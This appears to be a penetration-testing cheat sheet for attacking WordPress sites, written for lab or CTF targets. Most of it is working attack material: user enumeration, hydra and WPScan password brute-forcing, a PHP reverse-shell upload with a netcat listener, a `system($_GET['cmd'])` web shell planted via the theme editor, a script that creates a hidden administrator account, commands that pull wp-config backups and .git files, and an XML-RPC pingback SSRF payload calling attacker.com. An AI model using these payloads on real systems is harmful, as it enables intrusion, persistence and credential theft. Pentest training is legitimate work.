# WordPress Attack Surface

!!! tip "Tip"
    `wpscan --url http://10.10.10.10 --enumerate u` to enumerate users first — then target those accounts. Check `/wp-json/wp/v2/users` for unauthenticated user enumeration even if wpscan is blocked.

!!! warning "Watch out"
    wpscan's plugin/theme detection is noisy and slow. Run `--enumerate p` only after confirming the scan won't trip rate limiting or WAF rules.

---

## Enumeration and Recon

### Identify WordPress CMS

Look for:

- `/wp-admin/`, `/wp-login.php`, `/xmlrpc.php`
- HTML meta generator tags: `content="WordPress 5.8.1"`
- Common file structure: `wp-content/themes`, `wp-includes`

### Tools

**WhatWeb**:

```bash
whatweb http://10.10.10.10
```

**Unauthenticated REST API user enumeration**:

```bash
curl -s http://10.10.10.10/wp-json/wp/v2/users | jq
```

Returns usernames (`slug` field) without authentication on most WordPress deployments — faster and quieter than wpscan.

---

## WPScan

### Install

```bash
sudo gem install wpscan
```

### Quick Scan

```bash
wpscan --url http://10.10.10.10
```

### Enumerate Plugins & Versions

```bash
wpscan --url http://10.10.10.10 -e vp --api-token $TOKEN -o wpscan.log
```

- `-e vp` – Enumerate vulnerable plugins
- `-e p` – Enumerate all plugins
- `-e u` – Enumerate usernames
- `--api-token` – Use your API key for vulnerability DB
- `-o` – Output scan to file

### Full Enumeration

```bash
wpscan --url http://10.10.10.10 -e ap,at,cb,dbe,u,m --api-token $TOKEN
```

| Flag | Description |
|---|---|
| `ap` | All Plugins |
| `at` | All Themes |
| `cb` | Config Backup Files (`wp-config.php~`) |
| `dbe` | DB Exports (e.g., `.sql`) |
| `u` | Usernames |
| `m` | Media files |

---

## Exploitation

### Brute Force Login

```bash
wpscan --url http://10.10.10.10 -U users.txt -P rockyou.txt --api-token $TOKEN
```

```bash
hydra -l admin -P rockyou.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
```

### Exploiting Vulnerable Plugins

```bash
searchsploit wp plugin <plugin-name>
```

### Exploit Upload Functionality

If a plugin allows file upload (e.g., `contact-form-7`, `revslider`):

1. Upload `.php` reverse shell
2. Access uploaded shell in browser
3. Trigger reverse shell back to listener

```bash
nc -lvnp 4444
```

---

## Post-Exploitation & Persistence

### WP Admin Shell via Theme Editor

1. Navigate to: `/wp-admin/theme-editor.php`
2. Edit `404.php` or `functions.php`:

```php
<?php system($_GET['cmd']); ?>
```

3. Browse to:

```
http://10.10.10.10/wp-content/themes/<theme>/404.php?cmd=whoami
```

### Create Admin User via Shell

```php
<?php
require('wp-load.php');
$user = 'pentester';
$pass = 'SuperSecure123!';
$email = 'root@localhost';
if (!username_exists($user)) {
  $user_id = wp_create_user($user, $pass, $email);
  $user = new WP_User($user_id);
  $user->set_role('administrator');
}
?>
```

```
http://10.10.10.10/wp-content/uploads/admin_create.php
```

---

## Manual Inspection

### Sensitive File Disclosure

```bash
curl http://10.10.10.10/.git/config
curl http://10.10.10.10/wp-config.php~
curl http://10.10.10.10/wp-content/debug.log
```

### Common Files to Check

- `wp-config.php`
- `.htaccess`
- `.user.ini`
- `.env`

### XML-RPC Abuse

Used for brute-force and pingback SSRF:

```bash
curl -X POST -d @payload.xml http://10.10.10.10/xmlrpc.php
```

```xml
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com</string></value></param>
    <param><value><string>http://localhost/</string></value></param>
  </params>
</methodCall>
```

---

## Tools

### Metasploit Modules

```bash
search wordpress
```

Examples:

- `exploit/unix/webapp/wp_admin_shell_upload`
- `exploit/multi/http/wp_crop_rce`

### Wordlists

- `SecLists/Discovery/Web-Content/CMS/wordpress.txt`
- `rockyou.txt` for brute-force
